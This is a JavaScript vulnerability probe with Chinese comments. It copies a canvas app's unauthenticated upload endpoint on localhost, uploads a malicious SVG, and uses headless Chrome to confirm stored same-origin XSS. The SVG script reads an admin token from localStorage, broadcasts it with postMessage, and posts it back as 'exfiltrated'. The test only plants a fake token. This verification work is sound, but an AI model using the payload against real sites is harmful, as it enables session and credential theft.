/**
 * 探针 H：未鉴权的资源上传 → 同源 SVG「存储型 XSS」。
 *
 * 目标服务按 routes/canvases.ts + store/mime.ts 的真实行为复刻：
 *   POST /api/canvases/:id/resources?name=x.svg   （无鉴权，CORS 全开）
 *   GET  /api/canvases/:id/resources/<hash>.svg   （content-type: image/svg+xml）
 *
 * 要验证的三件事：
 *   1. 匿名请求能不能上传成功；
 *   2. 直接打开那个地址时，SVG 里的脚本会不会执行（= 同源 XSS）；
 *   3. 在那个文档里能不能读到同源 localStorage（= 令牌可被偷走）。
 */
import { spawn } from 'node:child_process'
import { mkdtempSync } from 'node:fs'
import { createHash } from 'node:crypto'
import os from 'node:os'
import path from 'node:path'
import { createRequire } from 'node:module'

const require = createRequire('D:/Code/Git/mini-canvas/packages/cloud-server/package.json')
const { Hono } = require('hono')
const { cors } = require('hono/cors')
const { serve } = require('@hono/node-server')

const CHROME = process.env.CHROME_EXE ??
  'C:/Users/Administrator/AppData/Local/ms-playwright/chromium-1243/chrome-win64/chrome.exe'

const store = new Map() // name -> { bytes, mime }
const ALLOWED_EXT = ['.png', '.jpg', '.svg', '.mp4', '.txt', '.json']

const app = new Hono()
app.use('*', cors())

// 与 routes/canvases.ts:93-111 同形
app.post('/api/canvases/:id/resources', async (c) => {
  const bytes = new Uint8Array(await c.req.arrayBuffer())
  if (!bytes.byteLength) return c.json({ ok: false, error: '空文件' }, 400)
  const name = c.req.query('name') ?? ''
  const dot = name.lastIndexOf('.')
  const ext = dot >= 0 ? name.slice(dot).toLowerCase() : ''
  const safeExt = ALLOWED_EXT.includes(ext) ? ext : ''
  const hashName = createHash('sha256').update(bytes).digest('hex').slice(0, 16) + safeExt
  store.set(hashName, { bytes, mime: safeExt === '.svg' ? 'image/svg+xml' : 'application/octet-stream' })
  return c.json({ ok: true, url: '/api/canvases/' + c.req.param('id') + '/resources/' + hashName, hashName })
})

app.get('/api/canvases/:id/resources/:name', (c) => {
  const hit = store.get(c.req.param('name'))
  if (!hit) return c.json({ ok: false, error: '资源不存在' }, 404)
  // 与 routes/canvases.ts:120-129 同形：按扩展名给 content-type，无 nosniff、无 CSP
  return c.body(hit.bytes, 200, { 'content-type': hit.mime, 'cache-control': 'public, max-age=31536000, immutable' })
})

app.get('/', (c) => c.html('<!doctype html><title>canvas app</title><h1>画布应用</h1>'))

const server = serve({ fetch: app.fetch, port: 0, hostname: '127.0.0.1' })
const port = await new Promise((r) => server.once('listening', () => r(server.address().port)))
const base = `http://127.0.0.1:${port}`

// —— 攻击者视角：纯匿名 HTTP，不需要任何令牌 ——
const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="300" height="80">
  <rect width="100%" height="100%" fill="#222"/>
  <text x="12" y="45" fill="#fff" font-size="16">svg payload</text>
  <script><![CDATA[
    var stolen = '';
    try { stolen = localStorage.getItem('mc_admin_token') || '(空)'; } catch (e) { stolen = '读不到: ' + e.message; }
    document.title = 'XSS-RAN token=' + stolen;
    parent.postMessage({ svgXss: true, token: stolen, origin: location.origin }, '*');
    fetch('/api/canvases/default/resources?name=beacon.txt', { method: 'POST', body: 'exfiltrated token: ' + stolen });
  ]]><\/script>
</svg>`

const up = await fetch(base + '/api/canvases/default/resources?name=payload.svg', {
  method: 'POST',
  headers: { 'content-type': 'image/svg+xml' },
  body: svg,
})
const upJson = await up.json()
console.log('=== 1. 匿名上传 ===')
console.log('status', up.status, JSON.stringify(upJson))

const svgUrl = base + upJson.url
const head = await fetch(svgUrl)
console.log('=== 2. 回读响应头 ===')
console.log('status', head.status)
console.log('content-type:', head.headers.get('content-type'))
console.log('content-security-policy:', head.headers.get('content-security-policy') ?? '(无)')
console.log('x-content-type-options:', head.headers.get('x-content-type-options') ?? '(无)')

// —— 浏览器视角：先在同源页面里种一个「令牌」，再打开上传的 SVG ——
const userDataDir = mkdtempSync(path.join(os.tmpdir(), 'mc-probe7-'))
const chrome = spawn(CHROME, [
  '--headless=new', '--remote-debugging-port=0', '--user-data-dir=' + userDataDir,
  '--no-first-run', '--no-default-browser-check', '--no-proxy-server', '--proxy-bypass-list=*',
  'about:blank',
], { stdio: ['ignore', 'pipe', 'pipe'] })

let stderr = ''
chrome.stderr.on('data', (d) => { stderr += String(d) })
const wsUrl = await new Promise((resolve, reject) => {
  const timer = setTimeout(() => reject(new Error('chrome 没启动：' + stderr.slice(-1500))), 20000)
  chrome.stderr.on('data', () => {
    const m = /DevTools listening on (ws:\/\/\S+)/.exec(stderr)
    if (m) { clearTimeout(timer); resolve(m[1]) }
  })
})
const dbgPort = new URL(wsUrl).port
const tgt = await (await fetch(`http://127.0.0.1:${dbgPort}/json/new?about:blank`, { method: 'PUT' })).json()
const ws = new WebSocket(tgt.webSocketDebuggerUrl)
await new Promise((r) => ws.addEventListener('open', r))

let id = 0
const pending = new Map()
const events = []
ws.addEventListener('message', (ev) => {
  const msg = JSON.parse(String(ev.data))
  if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id) }
  if (msg.method === 'Runtime.exceptionThrown') events.push('exception: ' + (msg.params?.exceptionDetails?.exception?.description ?? ''))
})
function send(method, params = {}) {
  const myId = ++id
  ws.send(JSON.stringify({ id: myId, method, params }))
  return new Promise((r) => pending.set(myId, r))
}

await send('Page.enable')
await send('Runtime.enable')

// 先在**同源页面**写入一个假令牌（模拟用户填过管理令牌）
await send('Page.navigate', { url: base + '/' })
await new Promise((r) => setTimeout(r, 800))
await send('Runtime.evaluate', {
  expression: "localStorage.setItem('mc_admin_token','FAKE-TOKEN-ABCDEF')",
})

// 再直接打开上传的 SVG
await send('Page.navigate', { url: svgUrl })
await new Promise((r) => setTimeout(r, 1200))

const title = await send('Runtime.evaluate', { expression: 'document.title', returnByValue: true })
const ls = await send('Runtime.evaluate', {
  expression: "JSON.stringify({ origin: location.origin, token: localStorage.getItem('mc_admin_token'), cookie: document.cookie })",
  returnByValue: true,
})
console.log('=== 3. 打开 SVG 之后 ===')
console.log('document.title =', title.result?.result?.value)
console.log('同源脚本能读到:', ls.result?.result?.value)
if (events.length) console.log(events.join('\n'))

console.log('=== 4. 服务器上多出来的写请求（XSS 自己发的）===')
console.log([...store.keys()].join(', '))

ws.close(); chrome.kill(); server.close()
process.exit(0)
